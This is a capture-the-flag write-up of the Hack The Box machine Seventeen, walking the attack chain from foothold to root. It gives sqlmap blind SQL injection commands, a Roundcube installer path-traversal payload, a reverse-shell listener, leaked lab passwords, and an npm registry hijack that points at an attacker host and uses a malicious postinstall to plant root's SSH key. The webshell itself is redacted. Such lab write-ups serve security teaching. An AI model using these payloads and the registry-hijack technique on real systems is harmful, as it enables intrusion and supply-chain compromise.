---
layout: post
title: "The Registry Pointed the Wrong Way"
subtitle: "HTB Seventeen, where a blind login field, a forgotten installer, and a hijacked package registry chain into root one borrowed secret at a time"
date: 2022-10-01 12:00:00 +0000
description: "A blind exam form bleeds a database, a forgotten installer runs your uploaded shell, and a registry pointed the wrong way installs your code as root."
image: /assets/og/the-registry-pointed-the-wrong-way.png
tags: [hackthebox, writeup]
---

Seventeen is a school with too many buildings. There is a campus website out front, an exam portal in one wing, an old file-management system in another, and a webmail server nobody finished installing. None of these buildings know the others exist, and that is the whole game. You ask the exam form a yes-or-no question ten thousand times until it spells out the student database one letter at a time. You take a student's password into the old file system and leave a shell behind. You point the half-built webmail installer at that shell, and it runs it without ever asking who you are. From there it is three borrowed secrets in a row. A database password that doubles as a login, a second password hardcoded into a logging package somebody wrote, and finally a private software registry that was supposed to point at the company server and instead points at yours. Root does not arrive because anything was forced. It arrives because every wall on this box had a secret already written on the other side, and nobody checked which direction the doors faced.

```
        S E V E N T E E N
        =================
        exam form:  "is the next letter > m?"   yes / no
                    asked ten thousand times → the whole db
                          |
                          v
        old file system  ←  student's password
        leave a shell in the locker marked 31234
                          |
        webmail installer (never finished)
        "include this config for me"  →  runs your shell
                          |
                          v
        then three borrowed keys: a db pass, a logger pass,
        and a registry aimed back at YOU. npm installs root.
                                                            門
```

## 0x01 · the campus map

Three ports answer, and the box is quiet about it. SSH, a web server on 80, and a second web server up on 8000.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp   open  http    Apache httpd 2.4.29 (Ubuntu)
8000/tcp open  http    Apache httpd 2.4.38 (Debian)
```

Two Apache versions on one host, one Ubuntu and one Debian, is a tell on its own. Different operating systems behind the same IP usually means containers, and that detail pays out later. The front page calls itself seventeen.htb, so the first job is to ask the server what other names it answers to. Web servers can host many sites on one address and decide which to serve by the `Host:` header your browser sends, the way one phone number can ring several different desks if you say the right name to the operator. Fuzz that header with `wfuzz` and filter out the boilerplate, and the operator hands you a directory.

```
$ wfuzz -u http://10.10.10.x -H "Host: FUZZ.seventeen.htb" --hw 18 ...
exam.seventeen.htb            (port 80)   exam management system
oldmanagement.seventeen.htb   (port 8000) school file management
mastermailer.seventeen.htb    (port 8000) roundcube webmail 1.4.2
```

Four buildings, one campus. Each one knows a little, and the whole box is teaching the others to talk.

## 0x02 · twenty questions with a database

The exam site has a page that loads a quiz by number, `?p=take_exam&id=1`. Any time a number from the URL steers a database query, you check whether the database can tell your number apart from your instructions. Append a logically true clause and the page loads normally. Append a false one and the page throws "Unknown Exam ID" and bounces you. That difference is the entire vulnerability.

```
?p=take_exam&id=1' AND 4755=4755 AND 'a'='a   → exam loads (true)
?p=take_exam&id=1' AND 4755=4756 AND 'a'='a   → "Unknown Exam ID" (false)
```

This is boolean-based blind injection (the bug class is logged as CVE-2020-12725 for this exam software). The database never prints its answers to you. It just behaves one way for true and another way for false, so you interrogate it one yes-or-no question at a time. Think of it like a hostage on the phone who can only tap once for yes and twice for no. You cannot ask "what is the password," but you can ask "is the first letter past M," then "past S," and narrow it down, letter by letter, until you have spelled the whole thing out of taps. Slow, mechanical, and total. Hand the pattern to `sqlmap` and let it do the tapping.

```
$ sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' \
    -p id --technique B --batch --threads 10 --dump

databases: erms_db, db_sfms, roundcubedb, information_schema
[db_sfms.student]  31234 | autodestruction | Kelly Shane
```

Three application databases sitting side by side. One belongs to the exam site, one to the old file system, one to the webmail. The injection in one building just read the locker combinations for all of them.

## 0x03 · a locker with a back wall

That student record, number 31234 with the password `autodestruction`, logs straight into oldmanagement, the school file management system on 8000. It is a plain upload portal. You sign in as the student and you can drop files into a folder named for your student number.

```
login: 31234 / autodestruction
upload → /var/www/html/oldmanagement/files/31234/
```

So you leave something behind. Not a runnable backdoor printed here, just a one-line PHP file whose only job is to run whatever command you hand it.

```
$ cat iceberg.php
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am writing it in brackets on purpose. The real version is shorter than this sentence, and the moment the literal string touches disk any antivirus on the planet quarantines it as malware. That reflex is the proof of how dangerous four words can be. The shell is sitting in the locker now, but the file system serves it as a download, not as code. It will not run on its own. We need another building to reach over and execute it for us.

## 0x04 · the installer that never logged out

That building is mastermailer, a Roundcube 1.4.2 webmail server, and its installer is still live. A finished install removes the setup directory. This one left it standing, which is the whole opening, because the installer runs as the web app and trusts its own forms completely.

Roundcube's installer carries CVE-2020-12640. When it writes out a config, it lets you name a plugin, and it builds a file path out of that name without checking it for `../` climbing. Picture a hotel checkout form that asks which room safe to empty and then walks to exactly that room. Write your own home address in the room field and the clerk dutifully walks off the property to your house and empties your safe instead. The form was built to read a number on the desk. It will just as happily read an address that leads off the grounds.

So you intercept the "create config" POST and steer that plugin field across the disk to the locker from the last section.

```
POST /mastermailer/installer/index.php
_plugins[]=../../../../../var/www/html/oldmanagement/files/31234/iceberg
```

The installer assembles that path, includes the file as PHP, and your locker shell finally runs. Trade it up for a real callback and a prompt lands.

```
$ nc -lvnp 443
connect from 10.10.10.x
$ id
uid=33(www-data) gid=33(www-data)
$ hostname
1a447de8638b      ← a container, just like the two Apache versions warned
```

One building read the locker. Another building opened it. Neither one knew it was being used as a hand for the other.

## 0x05 · the password that moonlighted

`www-data` inside a container is a poor place to stay, so you read the source the web apps left lying around. The employee management system keeps its database handle in the open.

```
$ cat /var/www/html/employeemanagementsystem/process/dbh.php
$conn = mysqli_connect("localhost","root","2020bestyearofmylife","ems");
```

On its own that only opens a database. But people reuse passwords the way they reuse a single house key for the front door, the shed, and the mailbox. `2020bestyearofmylife` is also the system password for a real user named **mark**, and mark takes SSH.

```
$ ssh mark@10.10.10.x       # password: 2020bestyearofmylife
mark@seventeen:~$ cat user.txt
████████████████████████████████
```

Mark is not the end. In his npm cache sits a private package called `db-logger`, written in-house by a user named kavigihan. Install it, read its source, and the connection string is baked right into the file.

```
$ cat node_modules/db-logger/logger.js
... password: 'IhateMathematics123#' ...
```

Same trick, second verse. That database password is also the login password for the user **kavi**. The pattern on this box is relentless. Every secret meant for one lock quietly opens a second one nobody thought about.

## 0x06 · a registry aimed back at you

Kavi has one sudo right, and it is the whole endgame.

```
kavi@seventeen:~$ sudo -l
    (root) NOPASSWD: /opt/app/startup.sh
```

That script is the launcher for an unfinished Node app. Before it starts, it checks for two packages, `db-logger` and `loglevel`, and runs `npm install` to fetch anything missing. It runs as root.

Here is the hinge. npm decides where to download packages from by reading a config file called `.npmrc` in the user's home directory. And Ubuntu 18.04 ships a sudo that keeps your `$HOME` variable even after you become root. So when kavi runs the script with sudo, root goes looking for packages, reads `$HOME` which still says `/home/kavi`, and obeys whatever registry kavi's `.npmrc` names. You own that file. So you point it at a package registry running on your own machine.

```
# on your box: a private npm registry (Verdaccio)
$ npm adduser --registry http://10.10.14.4:4873
$ npm publish --registry http://10.10.14.4:4873   # malicious loglevel@2.0.1

# in kavi's home: aim npm at you
$ echo 'registry=http://10.10.14.4:4873/' > ~/.npmrc
```

Then you publish your own `loglevel`, version 2.0.1, higher than the real 1.8.0 so npm prefers it, with a postinstall step that runs your code. Think of it like a contractor who builds from a parts catalog, and you slipped him a catalog with your phone number printed over the real supplier's. He calls the number on the page he was handed. He has no way to know it rings your desk instead of the warehouse. When root runs the startup script, npm fetches your `loglevel` from your registry and runs your install hook as root.

```
kavi@seventeen:~$ sudo /opt/app/startup.sh
# your postinstall drops an SSH key into /root/.ssh/authorized_keys

$ ssh -i iceberg_key root@10.10.10.x
root@seventeen:~# cat root.txt
████████████████████████████████
```

The script did exactly its job. It installed a dependency. The only thing that changed was which direction the registry pointed, and the registry pointed at you.

## 0x07 · the honest caveat

Every step on Seventeen is a building trusting an address it never checked. The exam form trusted that a number in the URL was only ever a number, and it became a query. The installer trusted that a plugin name was only ever a name, and it became a file path that climbed off the disk. Those two are the same disease that powers SQL injection and path traversal everywhere. Somewhere a program took a stranger's text and let part of it reach into the machinery and pull a lever, instead of holding it as inert data. That line between data and instruction is the entire job, and this box crosses it twice in the first three rooms.

But the step that should keep you up is the last one, because nothing there was a bug. npm did precisely what it is built to do. It read a config file and downloaded from the registry that file named. The vulnerability was a chain of small, reasonable-looking trusts. A password reused across a database and a login. A sudo rule that preserved a home directory. A writable config that decides where your code comes from. None of those is exploitable alone, and stacked together they install an attacker's code as root with no exploit anywhere in sight. This is what a supply-chain compromise actually looks like up close. You do not break the build. You change where the build shops, and you let it import you. The patch for an injection bug is a date on a calendar. The patch for "we trusted the registry pointer" is paranoia about every input that decides where your software comes from, and that one does not arrive on a Tuesday.

## 0x08 · outro

```
the form answered yes or no until it spelled the whole database.
the installer ran a shell it found at an address you wrote.
the registry shipped your code because it pointed back at you.

four buildings, none of them forced. each one trusted
an address on an envelope and never asked which way it faced.

check the input that picks the source. never reuse the key. wear black.

                                                            EOF
```

---

*HTB: Seventeen, retired 24 Sep 2022. A hard Linux box that is really a lecture on misplaced trust, from a blind login field all the way to a package registry aimed the wrong way. The exam form still taps out its answers in a lab and nowhere you don't own.*